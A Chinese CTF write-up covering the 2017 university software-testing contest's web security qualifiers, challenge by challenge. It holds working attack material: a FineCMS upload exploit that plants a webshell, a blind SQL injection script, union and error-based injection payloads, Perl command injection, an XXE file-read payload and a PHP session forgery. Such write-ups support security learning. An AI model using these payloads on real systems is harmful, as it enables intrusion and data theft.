---
title: 2017 全国大学生软件测试大赛web安全赛预赛 WriteUp
tags:
  - CTF
  - WriteUp
  - 文件包含
  - 编辑器泄露
date: 2017-10-23 20:20:13
---

其实就是慕测安恒杯
6月18日的夏季预赛线上赛，9月22日更新babysql，10月12日更新findpwd、服务发现、babylogin
10月23更新秋季预赛题目
<!-- more -->

# 夏季预赛

## 根据ip查dns解析记录

题目原意是让我们用cmd的nslookup命令，我直接上dns反查网站查的

到这个网站查dns解析[https://www.boip.net/ipv4/](https://www.boip.net/ipv4/)

flag为`this-is-flag`

## 编辑器泄露

题目提示编辑器泄露,fuzz后下载到了`login.php.swp`，用`vim -r login.php.swp`恢复得到源码，看到明文账号密码，
```php
if ($userin=="admin94wo")
if($passin=="ca1buda0mima7ah4ha")
```
用账号密码登录login.php得到flag，`flag{b4ckup_1s_normal}`

## babywaf

fuzz后发现 &lt; 被过滤了，构造post file=.&lt;./.&lt;./.&lt;./.&lt;./.&lt;./flag 提交得到flag，`flag{To0_young_2_simple!}`

## 综合渗透

题目提示让我们复现exp，该站用的是`finecms`

百度得到此cms的一个上传漏洞，构造html文件如下，上传一个`phtml`后缀的一句话上去，菜刀连接在`/flag`得到flag，`flag{o1d_bug_t0_send_point!}`

```html
<!DOCTYPE html>
<html>
    <head>
    <meta charset=”utf-8″>
    <title>Finecms ajaxswfupload exp</title>
    </head>
    <body>
        <form action=”http://114.55.88.132:20580/index.php?c=attachment&a=ajaxswfupload” method=”POST” enctype=”multipart/form-data”>
            <input type=”file” name=”Filedata”>
            <input type=”hidden” name=”type” value=”phtml”>
            <input type=”hidden” name=”size” value=”100″>
            <input type=”submit” name=”submit” value=”上传文件”>
        </form>
    </body>
</html>
```

## babysql

这道题到最后也没做出来，报错注入注，过滤了`union`和`column_name`还有`*`，不知道字段名是啥

参考了[http://www.wupco.cn/?p=3764](http://www.wupco.cn/?p=3764)  
从该文章中可以得知这道注入题的核心代码如下
```php
$sql = "desc `error_{$table}`";
$res = mysql_query($sql);
if(empty(mysql_fetch_array($res))){
    echo "<center>no table detail</center>";
    die();
}

$sql = "select * from error_${table} where id = $id";
```
可以看出通过`desc`语句判断table是否存在，再执行下一个sql语句  
DESC的语法如下  
```
DESC tbl_name [col_name | wild]
```
构造payload如下  
```
http://114.55.36.69:20680/index.php?table=flag` `a%&id=3
```
python脚本如下
```python
#!/usr/bin/env
# -*- coding: utf-8 -*-
import requests as r
r1=r.session()
s="abcdefghijklmnopqrstuvwxyz1234567890_"
flag=""
for i in range(50):
  url="http://114.55.36.69:20680/index.php?table=flag` `{0}%&id=3"
  for j in s:
    url2=url.format(str(flag+j))
    r2=r1.get(url2)
    if "SQL" in r2.text:
      flag+=j
      print flag
      break
```
得到`error_flag`表的字段名为`flag_you_will_never_know`  
再使用报错注入查询即可拿到flag  
```
http://114.55.36.69:20680/index.php?table=news&id=3 -updatexml(1,concat('a=.',(select flag_you_will_never_know from error_flag)),1)#
```

## 服务发现
nmap扫描后发现`rsync`开放
rsync空口令
```bash
[root@test ~]# rsync 118.178.18.181::
source code   
[root@test ~]# rsync 118.178.18.181::source\ code/
drwxr-xr-x        4096 2017/06/14 13:01:20 .
-rw-r--r--          44 2017/06/14 13:01:20 flag.php
-rw-r--r--          26 2017/06/14 13:01:20 index.php
[root@test ~]# rsync -azv 118.178.18.181::source\ code/flag.php ~/flag.txt
receiving incremental file list

sent 19 bytes  received 41 bytes  120.00 bytes/sec
total size is 44  speedup is 0.73
[root@test ~]# cat flag.txt
<?php
$flag = "flag{rsync_i5_very_useful!}";
```

## findpwd
题目提示了开发者用的ide是netbean，查看ide工作空间的文件
```
http://118.178.18.181:20880/nbproject/private/private.xml
```

```xml
<project-private xmlns="http://www.netbeans.org/ns/project-private/1">
<editor-bookmarks xmlns="http://www.netbeans.org/ns/editor-bookmarks/2" lastBookmarkId="0"/>
<open-files xmlns="http://www.netbeans.org/ns/projectui-open-files/2">
<group>
<file>file:/var/www/html/fuckbean/index.php</file>
<file>
file:/var/www/html/fuckbean/f1ndmyp4ssw0rdnineverno.php
</file>
<file>file:/var/www/html/fuckbean/1.sql</file>
</group>
</open-files>
</project-private>
```
可以看到`1.sql`和`f1ndmyp4ssw0rdnineverno.php`两个文件
f1ndmyp4ssw0rdnineverno.php是个输入邮箱找回密码的页面
下载`1.sql`，这里就可以猜测可能是注入
```sql
drop database if exists fuckbean;
create database fuckbean;
use fuckbean;
create table users(
id int(5),
username varchar(20),
password varchar(32),
mail    varchar(50)
);
insert into users values(1,"admin","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","admin@admin.com");
grant all privileges on fuckbean.* to fuckbean@localhost identified by 'fuckbean';
```
构造
```
a'union select 1,2,3,0xxxxxxx-- a@qq.com
```
其中`0xxxxxxx`是你自己的邮箱的hex，提交后收到flag邮件

## babylogin
题目给了源代码，关键语句如下
```php
...

foreach (array('_GET','_POST','_COOKIE') as $key) {
    foreach ($$key as $key2 => $value) {
        $_GPC[$key2]=$value;
    }
...
...

$session = json_decode(base64_decode($_GPC['__session']), true);
    if (is_array($session)){
        $user = find_user_by_uid($session['uid']);
        if(is_array($user) && $session['hash'] == $user['password']){
            $_SESSION["login"]=1;
            $_SESSION["userin"]=$userin;
            header("Location: admin.php");
            exit();
        }else{
            echo "用户名或密码错误";
        }
    }

}
```

可以看出`session`可控，而且存在`==`弱类型,`True=="xxxxxxx"` 恒成立
用如下代码构造payload
```php
$session['uid']=1;
$session['hash']=True;

echo base64_encode(json_encode($session));
```
最后抓登陆的包，加一个参数`__session`值为`eyJ1aWQiOjEsImhhc2giOnRydWV9`就能跳转到`admin.php`

## php的锅
改天写好了



# 秋季预赛

## 都是php就不好玩了呀 
题目地址： http://118.178.18.181:57016/index.pl?file=test.txt
perl写的，直接读取`index.pl`就能拿到flag
```
http://118.178.18.181:57016/index.pl?file=index.pl
```

## 查询ip
夏季预赛的题，直接nslookup
```bash
C:\Users\xxxxxx>nslookup 107.182.177.34
服务器:  UnKnown
Address:  172.16.0.1

名称:    this-is-flag
Address:  107.182.177.34
```

## mac就是好用
题目地址： http://118.178.18.181:57013/
下载`http://118.178.18.181:57013/.DS_store`,cat一下，发现`s h o w m e f l a g . p h p`字样
访问
```
http://118.178.18.181:57013/showmeflag.php
```
拿到flag

## 人，才是最大的漏洞
题目地址： http://114.55.36.69:57012/
经典登录框注入，构造
```
username=1'union select md5(1)#
password=1
```
拿到flag

## sqlmap没有卵用 
题目地址： http://118.178.18.181:57019/
右键源代码提示`source.php`,union和from前面只能存在字母，不能有空格，构造`\N`绕过，(我也不知道为啥只有`\N`可以，小写n的不行)
```sql
\Nunion select 1,flag, \Nfrom flag%23 
 // \N表示回车，在Linux中表示一行的结束。
 ```

## 都是php就不好玩了呀
题目地址： http://118.178.18.181:57016/index.pl?file=test.txt
构造代码注入，这里要把含有flag的用base64编码
```
http://118.178.18.181:57016/index.pl?file=test.txt| `echo Y2F0IC92YXIvd3d3L2h0bWwvZmxhZy5wbA==| base64 -d`|
```

## can u read me,do u understand me?
题目地址： http://114.55.36.69:57018/
XXE,直接读取flag.php，读取出来的源码是phpjiami过的，可以去花钱解也可以直接用工具解
```
<!DOCTYPE xdsec[
<!ELEMENT methodname ANY>
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">]>
<user><name>&file;</name></user>
```

## 还记得找回密码的功能嘛
题目地址： http://114.55.36.69:57014/
给了源码
payload
```
'union select 1,2,3,4 -- yourqq@qq.com
```
这里主要是利用了空格会被分割成多个收件人